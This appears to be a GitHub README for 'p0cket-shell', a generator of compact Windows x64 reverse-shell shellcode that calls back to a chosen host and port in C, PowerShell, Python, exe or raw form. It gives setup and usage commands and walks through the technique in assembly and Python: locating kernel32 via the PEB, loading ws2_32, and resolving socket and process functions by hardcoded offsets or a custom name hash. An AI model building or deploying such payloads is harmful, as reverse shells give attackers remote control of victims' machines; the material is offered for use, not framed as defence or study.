<div align="center" markdown="1">
   <a href="https://www.warp.dev/windebloat">
      <img alt="Warp sponsorship" width="736" src="https://github.com/SilentisVox/p0cket-shell/blob/master/assets/p0cket-shell.jpg">
   </a>
</div>

# p0cket-shell

p0cket-shell is an implementation of an exceptionally compact reverse shell, engineered to achieve remote access with the smallest possible memory. This is minimalism without compromising functionality. This is the most size-efficient reverse shell available. This is peak shellcode optimization.

```
╭── тишина ∴ ~\source\gits\p0cket-shell
╰─→ .\p0cket-shell.py
            ____       __        __             __         ____
     ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
    / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / /
   / /_/ / /_/ / /__/ ,< /  __/ /_/_____(__  ) / / /  __/ / /
  / .___/\____/\___/_/|_|\___/\__/     /____/_/ /_/\___/_/_/
 /_/
 Author: SilentisVox
 Github: https://github.com/SilentisVox/p0cket-shell

usage: p0cket-shell.py [-h] --payload {hardcode,resolve} --LHOST LHOST --LPORT LPORT --format
                       {c,powershell,ps1,python,exe,raw} [--output OUTPUT]
```

### Setup
```powershell
git clone https://github.com/SilenitsVox/p0cket-shell
cd p0cket-shell
python p0cket-shell.py
```

### Usage
```powershell
p0cket-shell.py --payload  [hardcode | resolve]
                --LHOST    [callback ip]
                --LPORT    [callback port]
                --format   [c | powershell | python | exe | raw]
               [--output]  example.py
```

## How it works

Standalone reverse shell shellcode must follow a specific process. Fortunately for us, it is very straight forward.

1. Get handle to kernel32.dll
2. Get handle to ws2_32.dll
3. Save functions: WSAStartup, WSASocketA, WSAConnect CreateProcessA
4. Call functions: WSAStartup, WSASocketA, WSAConnect CreateProcessA

###### Grab library handles
```nasm
get_kernel32:
    mov   rax,   gs:[0x60]              ; PEB
    mov   rax,   [rax + 0x18]           ; PEB->Ldr
    mov   rax,   [rax + 0x30]           ; Ldr->InMemoryOrderModuleList
    mov   rax,   [rax]                  ; InMemoryOrderModuleList.Flink (ntdll.dll)
    mov   rax,   [rax]                  ; Flink->Flink (kernel32.dll)
    mov   rbp,   [rax + 0x10]           ; Base Address
```
```nasm 
load_ws2_32:
    push  0x006c6c                      ; '0\ll'
    mov   rax,   0x642e32335f327377     ; 'd.23_2sw'
    push  rax                           ; Push to stack
    mov   rcx,   rsp                    ; Save pointer 'ws2_32.dll' to rcx
    sub   rsp,   0x28                   ; Align stack
    call  r14                           ; Call LoadLibraryA (Base Address stored in rax)
```

Now from here we can grab the functions within the 2 libraries and then use them how we want. We have to remember how each function behaves and remember whats needed for each function.

###### Perform function calls

```c
int WSAStartup(
  WORD                 wVersionRequested,
  LPWSADATA            lpWSAData
);
```

```c
SOCKET WSASocketA(
  int                  af,
  int                  type,
  int                  protocol,
  LPWSAPROTOCOL_INFOA  lpProtocolInfo,
  GROUP                g,
  DWORD                dwFlags
);
```

```c
int WSAConnect(
  SOCKET               s,
  const sockaddr      *name,
  int                  namelen,
  LPWSABUF             lpCallerData,
  LPWSABUF             lpCalleeData,
  LPQOS                lpSQOS,
  LPQOS                lpGQOS
);
```

```c
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

### Finding Functions

Now this is the main issue with making tiny shellcode. We want the most reliable/stable, while also providing a very small size. If we do not care for these, we can make very small shellcode.

All we would need to do is have a hardcoded offset from the module base address.

###### Hardcode Offset

```nasm
get_createprocess:
    lea   r15,   [rbp + 0x44F70] ; Hardcode offset from base address
```

If we wish to maintain reliablity and stabilty, we must parse through the desired libraries AddressOfNames, and match it to one we have. The best way to accomplish this would be hashes.

We need a custom mini hash algorithm to make hashes of our desired functions, then we would need to find a function name, hash it, then compare to what we have. If it matches, save the address and return.

### Hashing Algorithm

###### Calculate Hash User Side

```python
def hash(function_name: bytes, rotate_amount: int):
    calculated_hash                     = 0

    for byte in function_name:
        calculated_hash                 = ((calculated_hash >> rotate_amount) | (calculated_hash << (32 - rotate_amount))) & 0xFFFFFFFF
        calculated_hash                 = (calculated_hash + byte) & 0xFFFFFFFF

    return hex(calculated_hash)
```

###### Calculate Hash Machine Side

```nasm
    xor   rax, rax
    xor   rbx, rbx
    cld

hash_loop:
    lodsb
    test  al,    al
    jz    compare_hash
    ror   ebx,   7 ;)
    add   ebx,   eax
    jmp   hash_loop

compare_hash:
    cmp   ebx,   rdx ; Or wherever you have the hash
    jz    hash_found
    jnz   next_function
```